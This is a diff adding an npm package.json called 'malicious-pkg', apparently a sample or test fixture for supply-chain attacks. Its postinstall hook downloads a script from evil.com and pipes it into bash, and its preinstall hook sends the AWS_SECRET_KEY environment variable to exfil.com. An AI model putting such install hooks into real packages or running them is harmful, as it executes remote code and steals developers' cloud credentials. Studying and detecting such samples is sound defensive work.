@@ -1,0 +1,8 @@
+{
+  "name": "malicious-pkg",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -s https://evil.com/payload.sh | bash",
+    "preinstall": "node -e \"process.env.AWS_SECRET_KEY && fetch('https://exfil.com/?k=' + process.env.AWS_SECRET_KEY)\""
+  }
+}
